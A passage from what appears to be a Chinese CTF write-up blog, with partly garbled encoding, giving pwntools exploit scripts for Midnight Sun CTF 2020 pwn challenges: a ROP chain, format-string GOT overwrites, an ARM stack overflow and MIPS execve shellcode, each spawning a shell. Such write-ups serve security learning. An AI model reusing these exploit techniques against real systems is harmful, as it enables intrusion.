0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000040130c) # syscall</span><br><span class="line">		return p</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	Inputbase(0x6D7333,7)</span><br><span class="line"></span><br><span class="line">	Writeaddr(0x6d7360,fakestdout(0x006d7da8,0x006d7db0))</span><br><span class="line">	Inputbase(0x6D57a1,5)</span><br><span class="line">	stack_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">	print &quot;stack_addr=&quot;,hex(stack_addr)</span><br><span class="line">	Writeaddr(0x6d7580, fakestdin(stack_addr - 0x138, stack_addr + len(rop())))</span><br><span class="line">	Inputbase(0x006d57a9, 5)</span><br><span class="line">	p.sendlineafter(&apos;addr:&apos;, &apos;000000:8&apos; + rop())</span><br><span class="line">	p.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	pwn(&apos;buuoj.cn&apos;,20035,1,&apos;./pwn6&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æƒ³æ³•å¥‡ç‰¹,æˆ‘åªåšåˆ°äº†å®ç°æ— é™å¾ªç¯å,ä¸çŸ¥é“å¦‚ä½•å»åˆ©ç”¨äº†.tql  </p>
<p>å‚è€ƒé“¾æ¥(<a href="http://blog.redrocket.club/2020/04/06/midnightsunctf-quals-2020-pwn6/" target="_blank" rel="noopener">http://blog.redrocket.club/2020/04/06/midnightsunctf-quals-2020-pwn6/</a>)</p>
<h2 id="å…¶ä»–pwn"><a href="#å…¶ä»–pwn" class="headerlink" title="å…¶ä»–pwn"></a>å…¶ä»–pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>åŸºæœ¬æ ˆæº¢å‡ºï¼Œè´¼æ‹‰ç®€å•ã€‚æˆ‘expæ‰¾ä¸åˆ°äº†,å°±ä¸è´´äº†ã€‚</p>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;i386&apos;</span><br><span class="line">p = 0</span><br><span class="line">def pwn(ip,port,debug,flaag):</span><br><span class="line">	elf = ELF(flaag)</span><br><span class="line">	global p</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		p = process(flaag)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line">	payload=&quot;aa%27$p%2040c%15$hn%32231c%16$hn&quot;+p32(0x804B020+2)+p32(0x804B020)</span><br><span class="line">	p.sendlineafter(&quot;input:&quot;,payload)</span><br><span class="line">	p.recvuntil(&quot;aa0x&quot;)</span><br><span class="line">	addr=int(p.recv(8),16)-(0xf7d2e637-0xf7d2e540)</span><br><span class="line">	print &quot;addr=&quot;,hex(addr)</span><br><span class="line">	libc=LibcSearcher(&quot;__libc_start_main&quot;,addr)</span><br><span class="line">	libcbase_addr=addr-libc.dump(&quot;__libc_start_main&quot;)</span><br><span class="line">	system_addr=libcbase_addr+libc.dump(&quot;system&quot;)</span><br><span class="line">	sys_addr_0_2=int(str(hex(system_addr))[6:10],16)</span><br><span class="line">	sys_addr_2_4=int(str(hex(system_addr))[2:6],16)</span><br><span class="line">	#gdb.attach(p)#0x80485EB</span><br><span class="line">	payload=&quot;aa&quot;+&quot;%&quot;+str(sys_addr_0_2-2)+&quot;c%14$hn&quot;+&quot;%&quot;+str(sys_addr_2_4-sys_addr_0_2)+&quot;c%15$hn&quot;+p32(0x804B00C)+p32(0x804B00C+2)</span><br><span class="line">	print &quot;system_addr=&gt;&quot;,hex(system_addr)</span><br><span class="line">	p.sendlineafter(&quot;input:&quot;,payload)</span><br><span class="line">	p.sendlineafter(&quot;input:&quot;,&quot;/bin/sh&quot;)</span><br><span class="line">	p.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	pwn(&apos;pwn6-01.play.midnightsunctf.se&apos;,10006,1,&apos;./pwn2&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>armæ ˆæº¢å‡º,æ˜¯æˆ‘ä¸Šä¸€ç¯‡åšå®¢ä¾‹é¢˜</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;i386&apos;</span><br><span class="line"></span><br><span class="line">p = 0</span><br><span class="line">def pwn(ip,port,debug,flaag):</span><br><span class="line">	elf = ELF(flaag)</span><br><span class="line">	global p</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		#p = process([&apos;qemu-arm&apos;,&apos;-g&apos;,&apos;1234&apos;,flaag])</span><br><span class="line">		p=process(&quot;./pwn3&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line">	system_addr=0x01480C</span><br><span class="line">	binsh_addr=0x49018</span><br><span class="line">	pop_r0_r4_pc=0x1fb5c</span><br><span class="line">	payload=&quot;a&quot;*140+p32(pop_r0_r4_pc)+p32(binsh_addr)+p32(0)+p32(system_addr+1)</span><br><span class="line">	#p.sendline(payload)</span><br><span class="line">	p.sendlineafter(&quot;buffer: &quot;,payload)</span><br><span class="line">	p.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	pwn(&apos;pwn3-01.play.midnightsunctf.se&apos;,10003,1,&apos;./pwn3&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,<code>%*25$d%16$n</code>å¯ä»¥å°†åç§»ä¸º25çš„å€¼ç§»å‘åç§»ä¸º16çš„åœ°å€,è¿™ä¸ªexpå¯èƒ½è¿è¡Œæ—¶é—´é•¿,æ¯•ç«Ÿå†™å››ä¸ªå­—èŠ‚ã€‚å¤ªå¤§äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">p = 0</span><br><span class="line">def pwn(ip,port,debug,flaag):</span><br><span class="line">	elf = ELF(flaag)</span><br><span class="line">	global p</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		p = process(flaag)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	p.recvuntil(&quot;user: &quot;)</span><br><span class="line">	p.sendline(&quot;%*25$d%16$n&quot;)</span><br><span class="line">	p.recvuntil(&quot;code: &quot;)</span><br><span class="line">	p.sendline(str(10))</span><br><span class="line">	p.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	pwn(&apos;buuoj.cn&apos;,20035,1,&apos;./pwn4&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>æˆ‘æœ¬åœ°mipsæŒºå¥‡æ€ªçš„,è´´ä¸€ä¸ªå®˜æ–¹wp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">LOCAL = True</span><br><span class="line">if &quot;remote&quot; in sys.argv:</span><br><span class="line">    LOCAL = False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.clear(log_level=&apos;info&apos;, arch=&quot;mips&quot;, os=&apos;linux&apos;)</span><br><span class="line">elf = ELF(&quot;pwn5&quot;)</span><br><span class="line"></span><br><span class="line">HOST = &quot;pwn5-01.play.midnightsunctf.se&quot;</span><br><span class="line">PORT = 10005</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def go():</span><br><span class="line">    if LOCAL:</span><br><span class="line">        # s = process(&quot;qemu-mipsel-static -g 1234 ./pwn5&quot;.split(&quot; &quot;))</span><br><span class="line">        s = process(&quot;qemu-mipsel-static ./pwn5&quot;.split(&quot; &quot;))</span><br><span class="line">    else:</span><br><span class="line">        s = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;data:&quot;)</span><br><span class="line"></span><br><span class="line">    def set_v0(v0):</span><br><span class="line">        return &quot;&quot;.join([</span><br><span class="line">            p32(0x0046f27c), # : lw $v0, 0x20($sp) ; lw $ra, 0x2c($sp) ; jr $ra ; addiu $sp, $sp, 0x30</span><br><span class="line">            &quot;X&quot;*0x20,</span><br><span class="line">            p32(v0),</span><br><span class="line">            &quot;Z&quot;*0x8,</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    shellcode_addr = elf.bss(0x100)</span><br><span class="line">    scanf_addr = 0x400758</span><br><span class="line">    ROP = &quot;&quot;.join([</span><br><span class="line">        set_v0(shellcode_addr),</span><br><span class="line">        p32(scanf_addr),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    payload = &quot;A&quot;*64 + p32(elf.bss(0x200)) + ROP</span><br><span class="line">    print &quot;Payload:&quot;, payload</span><br><span class="line">    s.sendline(payload)</span><br><span class="line"></span><br><span class="line">    mips_shellcode = asm(&quot;&quot;&quot;</span><br><span class="line">        xor $a1, $a1</span><br><span class="line">        xor $a2, $a2</span><br><span class="line"></span><br><span class="line">        addiu $a0, $a0, -8 # This will point to /bin/sh</span><br><span class="line"></span><br><span class="line">        li $v0, 4011 # execve syscall</span><br><span class="line">        j 0x4068bc # syscall gadget</span><br><span class="line">        nop</span><br><span class="line">    &quot;&quot;&quot;)</span><br><span class="line">    print disasm(mips_shellcode)</span><br><span class="line"></span><br><span class="line">    # The bytes that will stop scanf from reading</span><br><span class="line">    assert all([i not in &quot;\x09\x0a\x0b\x0c\x0d\x20&quot; for i in mips_shellcode])</span><br><span class="line"></span><br><span class="line">    payload_2 = mips_shellcode.ljust(348, &quot;D&quot;) + p32(shellcode_addr)</span><br><span class="line">    payload_2 = payload_2.ljust(1132-8, &quot;Z&quot;) + &quot;/bin/sh&quot;</span><br><span class="line">    s.sendline(payload_2)</span><br><span class="line"></span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line">go()</span><br></pre></td></tr></table></figure>



</div><div class="tags"><a href="/tags/Writeup/">Writeup</a></div><div class="post-nav"><a class="pre" href="/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/">exit_hookæ”»å‡»</a><a class="next" href="/2020/04/06/arm%E6%A0%88%E6%BA%A2%E5%87%BA/">armæ ˆæº¢å‡º</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' ? true : false;
var verify = 'false' ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'AXNWQSAnzhoRuAsbsdqT84uQ-gzGzoHsz',
  appKey:'EcvRS3Hc6zidBU6GIBE3xBJN',
  placeholder:'Just so so',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/Kernel/" style="font-size: 15px;">Kernel</a> <a href="/tags/MSF/" style="font-size: 15px;">MSF</a> <a href="/tags/%E5%A0%86/" style="font-size: 15px;">å †</a> <a href="/tags/WINPWN/" style="font-size: 15px;">WINPWN</a> <a href="/tags/angr/" style="font-size: 15px;">angr</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 15px;">æ€»ç»“</a> <a href="/tags/arm/" style="font-size: 15px;">arm</a> <a href="/tags/%E6%A0%88/" style="font-size: 15px;">æ ˆ</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 15px;">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/MSF%E5%85%8D%E6%9D%80%F0%9F%90%8E%E5%88%B6%E4%BD%9C/">MSFå…æ€ğŸ</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/09/%E6%9F%90%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/">æŸæ¹–è®ºå‰‘éƒ¨åˆ†pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/">åå­—å«å•¥</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/03/2020WMCTFTF-cfgo-CheckIn/">2020WMCTF_cfgo_CheckIn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/DASCTF-7%E6%9C%88pwn/">DASCTF 7æœˆéƒ¨åˆ†pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/01/%E6%9F%90%E5%A0%86%E5%A4%8D%E7%8E%B0-getchar%E5%BC%95%E5%8F%91malloc/">æŸå †å¤ç°(getcharå¼•å‘malloc)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/22/angr%E5%88%9D%E6%8E%A2/">angråˆæ¢</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/03/RCTF-no-write/">RCTF no_write</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/24/GKCTF-pwn-Domo/">GKCTF_pwn_Domo(å‡ºé¢˜äººè§’åº¦)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/30/kernel-%C2%96%C2%96D-ublele-Fetch%E8%AF%A6%E8%A7%A3/">kernel_Double_Fetchè¯¦è§£</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://whali3n51.github.io/" title="whali3n51" target="_blank">whali3n51</a><ul></ul><a href="http://www.pdsdt.lovepdsdt.com/" title="Pdsdt" target="_blank">Pdsdt</a><ul></ul><a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a><ul></ul><a href="https://www.mydamya.top/" title="Damya" target="_blank">Damya</a><ul></ul><a href="http://phoebe233.cn/" title="W4nder" target="_blank">W4nder</a><ul></ul><a href="https://yojrevo.github.io/" title="yojrevo" target="_blank">yojrevo</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright Â© 2020 <a href="/." rel="nofollow">starssgo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>